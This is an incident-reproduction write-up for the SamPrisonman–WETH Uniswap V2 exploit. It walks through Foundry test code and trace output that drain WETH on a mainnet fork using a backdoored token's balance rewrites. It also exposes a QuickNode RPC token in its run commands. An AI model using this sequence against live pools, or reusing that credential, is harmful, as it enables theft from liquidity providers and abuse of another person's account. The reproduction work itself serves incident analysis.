## 1. Overview & Context

This proof-of-concept (PoC) reproduces the SamPrisonman–WETH Uniswap V2 exploit on an Ethereum mainnet fork.  
The original incident used a malicious ERC20 token, SamPrisonman (`SBF`), wired to a hidden helper contract to rewrite the SamPrisonman balance recorded for the SamPrisonman–WETH pair while leaving `totalSupply` unchanged.  
With only 4000 wei of input, the adversary drained approximately 6.58 ETH of WETH liquidity from the SamPrisonman–WETH pool in a single transaction.

The PoC demonstrates this same backdoor-driven mis-accounting and reserve drain using Foundry tests:

- It runs on a fork of Ethereum mainnet at the documented pre-exploit block.
- It interacts with the real SamPrisonman token, helper contract, WETH, Uniswap V2 router, and SamPrisonman–WETH pair.
- It mirrors the full on-chain sequence: router buy → skim + helper-backed transfers → sync → router sell.
- It enforces oracles that match the incident’s quantitative and qualitative properties.

### How to Run the PoC

From the Forge project root:

```bash
cd forge_poc

# Ensure QUICKNODE_ENDPOINT_NAME and QUICKNODE_TOKEN are exported (already in .env)
export QUICKNODE_ENDPOINT_NAME="indulgent-cosmological-smoke"
export QUICKNODE_TOKEN="a6a53e47429a27dac299922d0d518c66c3875b2e"

# Build the Ethereum mainnet RPC_URL using the provided template (chainid = 1)
export RPC_URL="https://${QUICKNODE_ENDPOINT_NAME}.quiknode.pro/${QUICKNODE_TOKEN}"

# Run the full test suite (including the exploit PoC) with detailed traces
forge test --via-ir -vvvvv
```

The key test is `SamPrisonmanExploitTest::testExploit` in `test/Exploit.t.sol`.

---

## 2. PoC Architecture & Key Contracts

The PoC is implemented as a Foundry test contract `SamPrisonmanExploitTest` in `forge_poc/test/Exploit.t.sol`. It uses interfaces for ERC20, WETH, UniswapV2 router, and UniswapV2 pair to interact with real mainnet contracts on a fork.

### Main Contracts and Addresses

- `SamPrisonman` (malicious ERC20)  
  - Address: `0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700`
  - Role: Backdoored token whose transfer logic delegates to an external helper and rewrites balances.
- `SamPrisonman Helper`  
  - Address: `0x7911425808e57b110D2451aB67B6980f9cA9D370`  
  - Role: External contract called via selector `0x569937dd` from the token’s `marketAndTIFFs` hook; it manipulates internal state to determine a 32-byte `result` used to overwrite `_balances[sender]`.
- `SamPrisonman–WETH UniswapV2Pair`  
  - Address: `0x76EA342BC038d665e8a116392c82552D2605edA1`  
  - Role: Liquidity pool whose SamPrisonman reserves are mis-accounted using the helper, enabling WETH drain.
- `UniswapV2Router02`  
  - Address: `0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D`  
  - Role: Router used for both buy (ETH→SBF) and sell (SBF→ETH) legs of the exploit.
- `WETH`  
  - Address: `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`
  - Role: Wrapped ETH backing the pool and ultimately drained to the attacker as ETH.

These addresses are defined as constants in the PoC:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
uint256 constant FORK_CHAIN_ID = 1;
uint256 constant FORK_BLOCK_NUMBER_PRE_EXPLOIT = 21992033;

address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant SAMPRISONMAN_ADDRESS = 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700;
address constant SAMPRISONMAN_WETH_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant HELPER_CONTRACT = 0x7911425808e57b110D2451aB67B6980f9cA9D370;
```

*Caption: The PoC pins to the real mainnet contracts and block height used in the incident.*

### Roles and Actors

- `attacker` – Fresh test EOA created via `makeAddr("Attacker")`; receives ETH profit.
- `driver` – Fresh test EOA that submits the initial `swapExactETHForTokensSupportingFeeOnTransferTokens` call.
- `trader` – Fresh test EOA holding SamPrisonman between the buy and sell legs and executing the final sell.

All three are labeled in traces to make the flow human-readable:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
attacker = makeAddr("Attacker");
driver = makeAddr("Driver");
trader = makeAddr("Trader");

vm.label(attacker, "attacker");
vm.label(driver, "driver");
vm.label(trader, "trader");
vm.label(WETH_ADDRESS, "WETH");
vm.label(SAMPRISONMAN_ADDRESS, "SamPrisonman");
vm.label(SAMPRISONMAN_WETH_PAIR, "SamPrisonman-WETH Pair");
vm.label(UNISWAP_V2_ROUTER, "UniswapV2Router02");
vm.label(HELPER_CONTRACT, "SamPrisonman Helper");
```

*Caption: The PoC uses fresh addresses with labels instead of real attacker EOAs, but binds to the real victim environment.*

### Fork Setup and Snapshot Variables

The test uses Foundry’s forking to reproduce the pre-exploit state:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    forkId = vm.createSelectFork(rpcUrl, FORK_BLOCK_NUMBER_PRE_EXPLOIT);
    vm.chainId(FORK_CHAIN_ID);

    vm.deal(attacker, 0.1 ether);
    vm.deal(driver, 0.1 ether);

    pairWethBefore = weth.balanceOf(SAMPRISONMAN_WETH_PAIR);
    pairSbfBefore = samPrisonmanToken.balanceOf(SAMPRISONMAN_WETH_PAIR);
    supplyBefore = samPrisonmanToken.totalSupply();

    assertGe(pairWethBefore, 5 ether, "pre-check: SamPrisonman-WETH pair must start with >= 5 WETH");
    assertGe(pairSbfBefore, 1e23, "pre-check: SamPrisonman-WETH pair must start with large SBF balance");
}
```

*Caption: The PoC forks mainnet at the documented pre-exploit block and enforces oracle pre-checks on pool reserves and token supply.*

---

## 3. Adversary Execution Flow

The core exploit logic is implemented in `reproducerAttack()` and invoked from `testExploit()`. It mirrors the real transaction’s phases:

1. Funding and environment setup.
2. Router buy leg (4000 wei ETH→SBF).
3. Helper-backed skim and transfer sequence that rewrites the pool’s SamPrisonman balance.
4. Router sell leg (SBF→ETH) that drains WETH from the pool to the attacker.

### Step 0 – Funding & Pre-Checks

- `vm.deal(attacker, 0.1 ether)` and `vm.deal(driver, 0.1 ether)` seed accounts for gas-like overhead.
- `pairWethBefore`, `pairSbfBefore`, and `supplyBefore` snapshot initial WETH reserves, SamPrisonman pool balance, and total supply.
- Pre-checks ensure:
  - WETH reserves ≥ 5 ETH.
  - SamPrisonman reserves are large (≥ 1e23 units).

These pre-checks enforce that the exploit is meaningful and consistent with the incident’s large-liquidity setup.

### Step 1 – Router Buy (ETH→SamPrisonman)

```solidity
// Origin: forge_poc/test/Exploit.t.sol
vm.startPrank(driver);

address[] memory pathBuy = new address[](2);
pathBuy[0] = WETH_ADDRESS;
pathBuy[1] = SAMPRISONMAN_ADDRESS;

router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4000}(
    0,
    pathBuy,
    trader,
    block.timestamp + 300
);

uint256 traderSbf = samPrisonmanToken.balanceOf(trader);
```

*Caption: The driver address buys SamPrisonman using 4000 wei via the real UniswapV2 router, sending tokens to `trader`, matching the seed transaction’s buy leg.*

This step reproduces the initial `swapExactETHForTokensSupportingFeeOnTransferTokens` call from the incident, including:

- 4000 wei input.
- Swap path WETH→SamPrisonman.
- SamPrisonman output sent to a fresh `trader` address.

### Step 2 – Helper-Backed Mis-Accounting (skim + transfers + sync)

After the buy, the PoC executes a sequence that leverages SamPrisonman’s external helper to rewrite the pair’s recorded SamPrisonman balance:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
// Step 2: helper-backed mis-accounting sequence that drives the pair's
// recorded SamPrisonman reserve to 1 while keeping its actual token
// balance high, as in the real exploit trace.
samPrisonmanWethPair.skim(SAMPRISONMAN_WETH_PAIR);

vm.stopPrank();

// Pair self-transfer of 0 SBF (called from the pair) to tick helper state.
vm.prank(SAMPRISONMAN_WETH_PAIR);
samPrisonmanToken.transfer(SAMPRISONMAN_WETH_PAIR, 0);

// Trader sends exactly 1 SBF back to the pair, leaving traderSbf - 1.
vm.prank(trader);
samPrisonmanToken.transfer(SAMPRISONMAN_WETH_PAIR, 1);

// Sync reserves so that getReserves reports SamPrisonman reserve = 1
// while balanceOf(pair) remains large.
vm.prank(trader);
samPrisonmanWethPair.sync();
```

*Caption: The PoC uses `pair.skim`, a 0-amount pair self-transfer, a 1-token transfer from `trader` to the pair, and `sync()` to drive the recorded SamPrisonman reserve down to 1 while leaving the true balance high—exactly as described in the root-cause trace analysis.*

Effectively:

- `skim(pair)` moves stray tokens to the pair itself.
- The pair, calling `SamPrisonman.transfer(pair, 0)`, triggers `marketAndTIFFs` and the helper, priming their internal state.
- Then `trader` sends 1 SBF to the pair, and `sync()` updates the Uniswap reserves to treat the pair’s SamPrisonman reserve as 1 unit even though `balanceOf(pair)` remains ~9.185e10 SBF.

This reproduces the observed on-chain mis-accounting where:

- `getReserves()` reports `(reserve0, reserve1) ≈ (6.5793e18 WETH, 1 SBF)`.
- `SamPrisonman.balanceOf(pair)` returns a large balance ~9.185e10 SBF.

### Step 3 – Router Sell (SamPrisonman→ETH)

Finally, the trader sells almost all SamPrisonman back to ETH, sending profit to the attacker:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
vm.startPrank(trader);

samPrisonmanToken.approve(UNISWAP_V2_ROUTER, type(uint256).max);

address[] memory pathSell = new address[](2);
pathSell[0] = SAMPRISONMAN_ADDRESS;
pathSell[1] = WETH_ADDRESS;

uint256 amountIn = traderSbf - 1;

router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    amountIn,
    0,
    pathSell,
    attacker,
    block.timestamp + 300
);

vm.stopPrank();
```

*Caption: The `trader` approves the router and sells nearly all SBF back to WETH/ETH, with proceeds sent to `attacker`; the pair’s mis-accounted reserves lead to a large WETH payout.*

This mirrors the sell leg of the seed transaction:

- The trader sells ~9.185e10 SBF back into the pool.
- Because the pair’s reserves believe there is only 1 SBF, the swap computes a near-maximal payout of WETH (~6.5793 ETH worth).
- WETH is withdrawn and ETH is forwarded to `attacker`.

### Step 4 – Post-State Snapshots

After the exploit sequence, the test captures post-state variables:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
attackerEthAfter = attacker.balance;
pairWethAfter = weth.balanceOf(SAMPRISONMAN_WETH_PAIR);
pairSbfAfter = samPrisonmanToken.balanceOf(SAMPRISONMAN_WETH_PAIR);
supplyAfter = samPrisonmanToken.totalSupply();
```

These are used to enforce the oracles described in the next section.

---

## 4. Oracle Definitions and Checks

The oracle definition file `artifacts/poc/oracle_generator/oracle_definition.json` specifies variables, pre-checks, and constraints that the PoC must enforce.

### Variables

Relevant variables from the oracle definition:

```json
{
  "variables": [
    { "name": "attacker", "address": null, "role": "Attacker", "symbol": "" },
    { "name": "eth", "address": "ETH", "role": "Token", "symbol": "ETH" },
    { "name": "weth", "address": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "role": "Token", "symbol": "WETH" },
    { "name": "samPrisonmanToken", "address": null, "role": "Token", "symbol": "SBF" },
    { "name": "samPrisonmanWethPair", "address": "0x76EA342BC038d665e8a116392c82552D2605edA1", "role": "Victim", "symbol": "UNI-V2" },
    { "name": "helperContract", "address": null, "role": "Other", "symbol": "" }
  ]
}
```

*Caption: Oracle variables identify the attacker, ETH, WETH, SamPrisonman token, SamPrisonman–WETH pair, and the helper.*

Mapping to the PoC:

- `attacker` → `address public attacker` (fresh EOA).
- `eth` → all `attacker.balance` and `vm.getBalance` checks.
- `weth` → `IWETH public weth = IWETH(WETH_ADDRESS)`.
- `samPrisonmanToken` → `IERC20 public samPrisonmanToken = IERC20(SAMPRISONMAN_ADDRESS)`.
- `samPrisonmanWethPair` → `IUniswapV2Pair public samPrisonmanWethPair = IUniswapV2Pair(SAMPRISONMAN_WETH_PAIR)`.
- `helperContract` → labeled `HELPER_CONTRACT` for trace readability.

### Pre-Check Oracles

The definition includes two pre-checks:

1. SamPrisonman–WETH pair must start with significant WETH reserves (≥ 5 ETH).
2. SamPrisonman–WETH pair must start with large SamPrisonman reserves (≥ 1e23).

The PoC enforces these in `setUp()`:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
pairWethBefore = weth.balanceOf(SAMPRISONMAN_WETH_PAIR);
pairSbfBefore = samPrisonmanToken.balanceOf(SAMPRISONMAN_WETH_PAIR);

assertGe(
    pairWethBefore,
    5 ether,
    "pre-check: SamPrisonman-WETH pair must start with >= 5 WETH"
);

assertGe(
    pairSbfBefore,
    1e23,
    "pre-check: SamPrisonman-WETH pair must start with large SBF balance"
);
```

*Caption: Pre-check oracles are implemented verbatim, ensuring the victim pool starts in a high-liquidity state similar to the real exploit.*

### Hard Constraint – H1: Total Supply Constant

Oracle definition:

- `H1_sbf_total_supply_constant` – SamPrisonman `totalSupply` must remain unchanged before and after the exploit.

Implementation in `testExploit()`:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
assertEq(
    supplyAfter,
    supplyBefore,
    "SamPrisonman total supply must not change during exploit"
);
```

*Caption: The PoC ensures the exploit works purely via reserve mis-accounting and not via minting or burning tokens.*

### Soft Constraint – S1: Attacker ETH Profit

Definition summary:

- Attacker must realize net profit in ETH ≥ 1 ETH relative to pre-exploit balance.

Implementation:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
uint256 ethProfit = attackerEthAfter - attackerEthBefore;
assertGe(
    ethProfit,
    1 ether,
    "attacker must gain at least 1 ETH in native ETH"
);
```

*Caption: The attacker’s ETH balance is recorded before and after the exploit, and the PoC requires a ≥ 1 ETH profit, approximating the ~6.58 ETH real-world gain.*

### Soft Constraint – S2: WETH Reserve Depletion

Definition summary:

- SamPrisonman–WETH pair must lose at least 1 ETH worth of WETH reserves.

Implementation:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
uint256 wethDelta = pairWethBefore - pairWethAfter;
assertGe(
    wethDelta,
    1 ether,
    "pool must lose at least 1 ETH worth of WETH reserves"
);
```

*Caption: The PoC validates that the pool’s WETH reserves are materially drained, matching the economic impact of the exploit.*

### Soft Constraint – S3: SamPrisonman Balance Mis-Accounting

Definition summary:

- SamPrisonman balance at the pair must drop sharply (≥ 1e20 units) while total supply is unchanged, reflecting helper-driven mis-accounting.

Implementation:

```solidity
// Origin: forge_poc/test/Exploit.t.sol
uint256 sbfDelta = pairSbfBefore - pairSbfAfter;
assertGe(
    sbfDelta,
    1e20,
    "pair's SamPrisonman balance must drop significantly due to helper-based mis-accounting"
);
```

*Caption: The PoC ensures the pair’s recorded SamPrisonman balance drops substantially, capturing the core invariance violation described in the root-cause report.*

### Summary of Oracle Alignment

All required elements from `oracle_definition.json` are explicitly enforced:

- Variables → matched to concrete interfaces and addresses.
- Pre-checks → implemented in `setUp()`.
- Hard constraint (H1) → implemented in `testExploit()`.
- Soft constraints (S1, S2, S3) → implemented in `testExploit()` using the same thresholds and semantics.

---

## 5. Validation Result and Robustness

### Forge Test Execution

The validator ran the PoC using the following command from the Forge project root:

```bash
cd forge_poc
RPC_URL="https://indulgent-cosmological-smoke.quiknode.pro/a6a53e47429a27dac299922d0d518c66c3875b2e" \
  forge test --via-ir -vvvvv \
  > /home/ziyue/TxRayExperiment/incident-202512281029/artifacts/poc/poc_validator/forge-test.log 2>&1
```

The log shows that:

- `SamPrisonmanExploitTest::testExploit` passes on the mainnet fork.
- The trace includes the expected helper call `SamPrisonman Helper::569937dd`, `pair.skim`, `pair.sync`, and a large WETH `swap` resulting in ETH sent to `attacker`.

Snippet from the validator log highlighting the sell leg:

```text
// Origin: forge-test.log (tail)
UniswapV2Router02::swapExactTokensForETHSupportingFeeOnTransferTokens(91855277955, 0, [SamPrisonman, WETH], attacker, ...)
  SamPrisonman::transferFrom(trader, SamPrisonman-WETH Pair, 91855277955)
    SamPrisonman Helper::569937dd(...)
    ...
  SamPrisonman-WETH Pair::getReserves() → (6579305366569804805, 1, ...)
  SamPrisonman::balanceOf(SamPrisonman-WETH Pair) → 91855277956
  SamPrisonman-WETH Pair::swap(..., amount0Out: 6579305366497962415, ...)
  WETH::withdraw(6579305366497962415)
  attacker::fallback{value: 6579305366497962415}()
```

*Caption: The forged test trace matches the root-cause description: helper-backed mis-accounting drives reserves out of sync, and a large WETH payout is sent to `attacker`.*

### Validator JSON Summary

The validator produced `artifacts/poc/poc_validator/poc_validated_result.json` with:

- `overall_status = "Pass"`
- `poc_correctness_checks.passes_validation_oracles.passed = "true"`
- All quality checks marked as `"true"` for:
  - Oracle alignment.
  - Human readability and labeling.
  - No unjustified magic numbers.
  - Mainnet fork with real contracts (no core mocks).
  - Self-contained attacker-side modeling (no real attacker EOAs/artifacts).
  - End-to-end attack process coverage.
  - Alignment with the documented root cause.

Key excerpt:

```json
{
  "overall_status": "Pass",
  "reason": "Forge tests on an Ethereum mainnet fork pass and the SamPrisonman exploit PoC faithfully reproduces the on-chain sequence and satisfies all defined oracles while meeting the required quality criteria.",
  "artifacts": {
    "validator_test_log_path": "/home/ziyue/TxRayExperiment/incident-202512281029/artifacts/poc/poc_validator/forge-test.log"
  }
}
```

*Caption: The validator confirms that the PoC is correct and high quality under the specified oracle and quality criteria.*

### Robustness Considerations

- The PoC depends only on the real mainnet contracts and the pre-exploit block; it does not rely on brittle trace replays or raw calldata.
- Thresholds for profit and reserve deltas allow for minor differences due to slippage or environment changes while still enforcing a materially similar exploit.
- The use of labeled, fresh attacker addresses keeps the PoC self-contained and reusable without linking to original attacker identities.

---

## 6. Linking PoC Behavior to Root Cause

The root-cause report attributes the exploit to a deliberately backdoored ERC20 token (SamPrisonman) wired to a hidden helper contract, which:

- Intercepts all transfers through `marketAndTIFFs`.
- Calls helper function `0x569937dd` to compute a 32-byte `result`.
- Overwrites `_balances[sender] = result - amount`.
- Leaves `totalSupply` unchanged while allowing arbitrary per-address balance rewrites.

### Exercising the Vulnerable Logic

The PoC explicitly exercises this helper-backed path:

- During the router buy and sell legs, SamPrisonman transfers from and to the pair trigger `_transfer` and `marketAndTIFFs`.
- The helper call `SamPrisonman Helper::569937dd(...)` appears in the `forge test` trace, confirming that the PoC traverses the same internal path as the real exploit.
- The skim / 0-transfer / 1-transfer / sync sequence drives the pair’s recorded SamPrisonman reserve to 1 while `balanceOf(pair)` remains large, reproducing the mis-accounting.

These steps match the root-cause narrative:

- Helper-driven rewriting of the pair’s balance (via `_balances[sender] = result - amount`).
- Constant total supply despite severe local balance changes.
- Reserved WETH drained from the pool once reserves are misreported.

### Demonstrating Victim Loss and Attacker Gain

The PoC’s oracles correspond directly to the incident’s observed effects:

- **Attacker profit (S1)** – The attacker’s ETH balance increases by at least 1 ETH (and in practice by ~6.579 ETH), reflecting a large net gain similar to the documented ~6.58 ETH profit.
- **Victim reserve depletion (S2)** – The pool’s WETH reserves drop by at least 1 ETH, capturing the economic loss to liquidity providers.
- **Pair balance mis-accounting (S3)** – The pair’s SamPrisonman balance drops sharply (≥ 1e20 units) while total supply stays constant, evidencing the backdoor’s manipulation of local balances.
- **Total supply invariant (H1)** – `totalSupply` remains equal before and after the exploit, showing that the exploit leverages mis-accounting rather than mint/burn.

Together, these assertions concretely demonstrate:

- How the helper-based transfer hook violates ERC20 accounting integrity.
- How Uniswap V2’s reserve-based pricing is subverted by a false view of SamPrisonman reserves.
- How liquidity providers suffer losses while the attacker realizes a deterministic profit.

### ACT Framing (Adversary–Chain–Target)

- **Adversary (A)** – The PoC’s `attacker`, `driver`, and `trader` roles collectively represent the adversary’s off-chain control; they craft and submit the sequence of swaps and transfers that trigger the helper.
- **Chain (C)** – The Ethereum mainnet fork at block `21992033` provides the real deployed contracts and helper state; the chain executes the backdoored token and helper logic as in production.
- **Target (T)** – The target is the SamPrisonman–WETH pair and its liquidity providers; the mis-accounting of SamPrisonman reserves and subsequent WETH drain directly impact them.

The PoC’s sequence (router buy → skim + helper-backed transfers → sync → router sell) fully realizes the exploit predicate and links directly back to the root cause:

- The helper’s hidden control over `_balances` is necessary to produce the mis-accounting.
- The Uniswap pair’s reliance on `balanceOf` and `getReserves` is exploited to misprice the sell leg.
- The attacker’s ETH profit and the pool’s WETH loss quantify the exploit’s impact.

---

## 7. Recommended Next Steps (Optional Enhancements)

Although the PoC passes all validation and quality criteria, the following refinements could make it even more robust and didactic:

- **Finer-grained assertions** – Add intermediate assertions (e.g., on `getReserves()` and `balanceOf(pair)` after each step) to more clearly show how each helper-backed operation changes the system’s state.
- **Negative tests** – Include a test that omits one of the key steps (such as the 1-token transfer or `sync()`) and demonstrates that the exploit no longer yields significant profit, highlighting the necessity of each action.
- **Threshold documentation** – At the top of `Exploit.t.sol`, document how thresholds like `5 ether`, `1e23`, `1 ether`, and `1e20` are derived from the incident’s data (pre-state reserves and observed profit) for future maintainers.

These improvements are not required for correctness but would strengthen the PoC as a reference exploit reproduction and teaching artifact.

